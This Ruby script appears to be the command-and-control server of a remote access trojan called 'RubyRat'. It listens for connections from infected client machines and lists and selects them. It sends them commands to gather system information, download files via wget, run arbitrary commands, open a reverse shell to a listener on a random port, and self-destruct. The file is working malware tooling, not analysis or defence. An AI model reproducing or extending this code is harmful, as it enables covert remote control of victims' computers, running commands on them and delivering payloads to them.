#!/usr/bin/env ruby
rrbase = __FILE__
$:.unshift(File.expand_path(File.join(File.dirname(rrbase), 'lib')))

require 'core'

debug_status = false
debug_status = true if ARGV.include? ("DEBUG")

def debug(msg='')
  puts "[#{"DEBUG".yellow}] #{msg}"
end

# Function to interact with client reverse shells
def drop_into_shell(port)
  debug "Reverse shell listener started on port #{port}"
  server = TCPServer.new('0.0.0.0', port)
  loop do
    client = server.accept
    client.puts gets.chomp!
    puts client.gets
  end
end

class Server
  attr_accessor :client_count
  attr_accessor :current_client
  attr_accessor :clients
  attr_accessor :key
  attr_accessor :iv

  def initialize(port)

    @client_count = 0
    @current_client = nil
    @clients = {}
    @s = TCPServer.new port
    @s.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
    @key = AES.key  # Varies PER SERVER LAUNCH, so clients can (almost) NEVER come back
    @iv = AES.iv(:base_64)

    # Write the key to a file for the client to read when being built
    File.open('/tmp/rratkey.dat', 'w') do |f|
      f.puts self.key
      f.print self.iv
    end
  end

  def run
    while true
      conn = @s.accept
      puts "\nNew connection from #{conn.peeraddr[3]}".green
      client_id = client_count + 1
      client = ClientConnection.new(conn, conn.peeraddr[3], self.key, client_id)
      @clients[client_id] = client
      @client_count +=1
    end
  end

  # Send data to the client
  def send_client(msg, client)
    begin
      #enc = AES.encrypt(msg, self.key, {:iv => self.iv})
      client.conn.write(msg.pad(64))  # Send minimal bytes over the wire, no command should be this long
    rescue Exception => e
      puts e.message.red
      puts e.backtrace.join("\n").red
    end
  end

  # Recieve data from the client
  def recv_client(client)
    #data =
    #return AES.decrypt(data, self.key, {:iv => self.iv})
    begin
      len = client.conn.gets  # Get the length of the results
      client.conn.read(len.to_i)
    rescue Errno::ECONNRESET
      puts 'Client seems offline'.red
      return
    end
  end

  def select_client(id)
    begin
      self.current_client = @clients[id]
      raise NoMethodError if self.current_client.nil?
      puts "#{'[*]'.blue} Client #{id} selected"
    rescue NoMethodError => e
      puts "#{'[*]'.red} Invalid id: #{id}"
      #puts e.backtrace.join "\n"

    end
  end

  def list_clients
    return '[*] '.blue + ' No clients :(' if @clients == {}

    table = Terminal::Table.new do |t|

      t << ['ID', 'Address']
      t << :separator

      @clients.each_pair { |id, conn| t << [id, conn.addr] }
    end
    return table
  end

  def get_clients
    a = []
    @clients.each_pair { |b, c| a << c}
    a
  end

  def goodbye
    ans = RubyRat::Helpers.prompt "Exit the server and selfdestruct all clients (Y/n)?".red
    if ans.downcase.include? 'y'
      get_clients.each { |c| send_client('selfdestruct', c) }
      exit 0
    end
  end

  def kill
    #p 'in kill'
  end
  # Print the help screen
  def help
    puts RubyRat::Helpers.help
  end

  def quit
    ans = Readline::readline "Exit server and lose all clients? (Y/n): ".red, false
    exit 0 if ans.downcase.include? 'y'
    return
  end

  # for use outside of the class
  def self.quit
    ans = Readline::readline "Exit server and lose all clients? (Y/n): ".red, false
    exit 0 if ans.downcase.include? 'y'
    return
  end
end


class ClientConnection
  attr_accessor :conn
  attr_accessor :addr
  attr_accessor :key
  attr_accessor :uid

  def initialize(conn, addr, key, uid=0)
    @conn  = conn
    @addr  = addr
    @key   = key
    @uid   = uid
  end
end

def run

  client_commands  = [ 'getpid', 'ifconfig', 'scan', 'sysinfo', 'pwd', 'wget', 'execute', 'ls', 'shell']
  general_commands = [ 'client', 'clients', 'help', 'history', 'clear', 'quit', 'exit']

  port = 4567
  port = ARGV[0].to_i if !ARGV[0].nil? && ARGV[0] != 'DEBUG'
  client = nil
  data = nil
  server = Server.new(port)

  Thread.new() { server.run }
  puts "Server started on #{port}".green

  while true
    trap('INT') {Server.quit}

    Readline.completion_append_character = " "

    exec_cmd = nil
    if !server.current_client.nil?
      list = client_commands + general_commands
      comp = proc { |s| list.grep( /^#{Regexp.escape(s)}/ ) }
      Readline.completion_proc = comp
      input = Readline::readline "#{"rrat".red} (Client #{server.current_client.uid}) > ", true
      exec_cmd = input
    else
      comp = proc { |s| general_commands.grep( /^#{Regexp.escape(s)}/ ) }
      Readline.completion_proc = comp
      input = Readline::readline "#{"rrat".red} > "
    end
    Readline::HISTORY.push(input)
    input, action = input.split(' ')

    # Check if the user is using a client command when no client is selected
    if client_commands.include?(input) && server.current_client.nil?
      puts '[!] '.red + "Please select a client first (#{server.client_count} available)"
      next
    end

    case input
    when nil  # Allow no input
      next
    when 'client'
      server.select_client(action.to_i)
    when 'clients'
      puts server.list_clients
    when 'goodbye'
      server.goodbye
    when 'help'
      server.help
    when 'history'
      Readline::HISTORY.each_with_index { |e, i|  puts "#{i}      #{e}" if !e.nil?}
    when 'clear'
      `clear`
    # Client commands
    when 'sysinfo'
      server.send_client('sysinfo', server.current_client)
      data = server.recv_client(server.current_client)
    when 'getpid'
      server.send_client('getpid', server.current_client)
      data = server.recv_client(server.current_client)
    when 'ifconfig'
      server.send_client('ifconfig', server.current_client)
      data = server.recv_client(server.current_client)
    when 'pwd'
      server.send_client('pwd', server.current_client)
      data = server.recv_client(server.current_client)
    when 'wget'
      server.send_client("wget #{action}", server.current_client)
      data = server.recv_client(server.current_client)
    when 'execute'
      server.send_client("execute #{exec_cmd.gsub('execute ', '')}", server.current_client)
      data = server.recv_client(server.current_client)
    when 'ls'
      server.send_client('ls', server.current_client)
      data = server.recv_client(server.current_client)
    when 'shell'
      rev_port = rand(500..65535)
      server.send_client("shell #{rev_port}", server.current_client)
      drop_into_shell(rev_port)
    when 'quit'
      server.quit
      next  # We should only get here if they choose 'no'
    when 'exit'
      server.quit
      next
    else
      puts '[*] '.red + "Unknown command: #{input}. Type 'help' for commands."
    end
    puts data if !data.nil?
    data = nil  # Reset the data

  end
end

puts RubyRat::Helpers.banner
run
